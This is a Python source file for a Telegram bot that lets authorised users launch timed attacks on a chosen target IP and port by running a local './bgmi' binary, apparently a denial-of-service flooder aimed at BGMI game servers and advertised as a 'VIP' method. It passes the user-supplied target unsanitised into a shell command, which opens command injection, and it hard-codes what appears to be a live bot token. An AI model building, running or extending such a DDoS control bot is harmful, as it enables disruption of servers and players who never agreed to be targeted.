# Bot Implementation

import os
import telebot
import subprocess
import datetime
import atexit
import threading

def cleanup_lock():
    if os.path.exists(LOCK_FILE):
        os.remove(LOCK_FILE)

atexit.register(cleanup_lock)

# ===== ADMIN CONFIG =====
admin_id = [1099673604]   # <-- PUT YOUR TELEGRAM USER ID HERE (INT, NO QUOTES)

# ===== GLOBAL STATE =====
DEV_MODE = False      # True for GitHub, False for VPS
bgmi_running = False  # tracks if bgmi is running
bgmi_process = None   # stores subprocess handle
bgmi_cooldown = {}    # user_id -> last command time
COOLDOWN_TIME = 10    # seconds

# insert your Telegram bot token here
bot = telebot.TeleBot('7844122825:AAGdzw7l_GZ1IL5QAVuUnQNsaGftq-uzYKI')

# File to store allowed user IDs
USER_FILE = "users.txt" 

# File to store command logs
LOG_FILE = "log.txt"

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to handle the reply when users run the /bgmi command
def start_attack_reply(message, target, port, duration):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name

    response = (
        f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃 🔥🔥\n\n"
        f"𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n"
        f"𝐏𝐨𝐫𝐭: {port}\n"
        f"𝐓𝐢𝐦𝐞: {duration} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n"
        f"𝐌𝐞𝐭𝐡𝐨𝐝: VIP - @shinoj_zakky"
    )

    bot.reply_to(message, response)

def attack(target, port, duration):
    full_command = f"./bgmi {target} {port} {duration} 500"
    subprocess.Popen(full_command, shell=True)

@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    global bgmi_running   # ✅ MUST BE FIRST LINE

    user_id = message.from_user.id
    user_id_str = str(user_id)

    # Authorization check
    if user_id not in admin_id and user_id_str not in allowed_user_ids:
        bot.reply_to(message, "🚫 Unauthorized Access!")
        return

    # Cooldown (admins bypass)
    if user_id not in admin_id:
        if user_id in bgmi_cooldown:
            elapsed = (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds
            if elapsed < COOLDOWN_TIME:
                bot.reply_to(
                    message,
                    f"Cooldown ❌ Wait {COOLDOWN_TIME - elapsed}s"
                )
                return
        bgmi_cooldown[user_id] = datetime.datetime.now()

    command = message.text.split()
    if len(command) != 4:
        bot.reply_to(message, "Usage: /bgmi <target> <port> <time>")
        return

    target = command[1]

    try:
        port = int(command[2])
        duration = int(command[3])
    except ValueError:
        bot.reply_to(message, "Port & time must be numbers ❌")
        return

    if duration > 600:
        bot.reply_to(message, "Time must be < 600 ❌")
        return

    log_command(user_id, target, port, duration)
    start_attack_reply(message, target, port, duration)

    # Start attack in a new thread
    attack_thread = threading.Thread(target=attack, args=(target, port, duration))
    attack_thread.start()

    bot.reply_to(message, "✅ BGMI command executed")

if __name__ == "__main__":
    try:
        bot.polling(none_stop=True, interval=2, timeout=20)
    except KeyboardInterrupt:
        print("Bot stopped by user")
    except Exception as e:
        print("Bot crashed:", e)
